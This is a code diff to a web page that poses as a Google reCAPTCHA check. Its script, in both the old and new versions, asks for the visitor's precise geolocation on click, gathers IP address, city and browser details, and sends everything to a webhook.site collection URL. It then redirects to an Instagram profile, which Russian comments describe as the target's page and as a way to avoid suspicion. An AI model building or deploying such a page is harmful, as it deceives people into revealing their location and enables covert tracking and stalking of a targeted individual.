@@ -11,11 +11,11 @@
         .rc-content { display: flex; align-items: center; }
         .checkbox-wrapper { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; position: relative; background: #fff; }
         .checkbox-wrapper.active::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 12px; border: solid #4285f4; border-width: 0 3px 3px 0; transform: rotate(45deg); }
-        .rc-text { font-size: 14px; color: #555; font-family: 'Roboto', arial; }
+        .rc-text { font-size: 14px; color: #555; }
         .rc-logo { text-align: center; }
         .rc-logo img { width: 32px; display: block; margin: 0 auto; }
         .rc-logo span { font-size: 8px; color: #555; }
-        #loader { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; }
+        #loader { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; text-align: center; }
     </style>
 </head>
 <body>
@@ -29,29 +29,29 @@
         <div class="rc-logo">
             <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
             <span>reCAPTCHA</span>
-            <div style="font-size:7px;">Конфиденциальность</div>
         </div>
     </div>
-    <div id="loader">Обработка данных безопасности...</div>
+    <div id="loader">Проверка региона доступа...</div>
 </div>
 
 <script>
-    const webhook = 'https://webhook.site/675c487a-3093-4826-9eb8-dd9f5ed15c0d';
+    // ТВОЙ URL ИЗ СКРИНШОТА
+    const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed';
 
     document.getElementById('captcha-cb').onclick = function() {
         const cb = this;
         cb.style.borderColor = '#4285f4';
         document.getElementById('loader').style.display = 'block';
 
-        // 1. Сбор ГЕОПОЗИЦИИ (Основная цель)
+        // 1. ЗАПРОС ГЕОПОЗИЦИИ
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 cb.classList.add('active');
                 sendData({
                     event: 'GEO_SUCCESS',
                     coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    map_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                    accuracy: pos.coords.accuracy + ' meters'
+                    google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                    accuracy: pos.coords.accuracy + 'm'
                 });
                 finish();
             }, (err) => {
@@ -62,9 +62,9 @@
             finish();
         }
 
-        // 2. Сбор IP и инфо об устройстве в фоне
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
-            sendData({ event: 'IP_INFO', data: data, agent: navigator.userAgent });
+        // 2. СБОР IP И ТЕХ. ДАННЫХ В ФОНЕ
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(ipData => {
+            sendData({ event: 'CLIENT_INFO', ip: ipData.ip, city: ipData.city, agent: navigator.userAgent });
         });
     };
 
@@ -74,7 +74,7 @@
 
     function finish() {
         setTimeout(() => {
-            // Редирект на тот самый инстаграм, чтобы не было подозрений
+            // Перенаправление на инстаграм цели
             window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ==";
         }, 1500);
     }
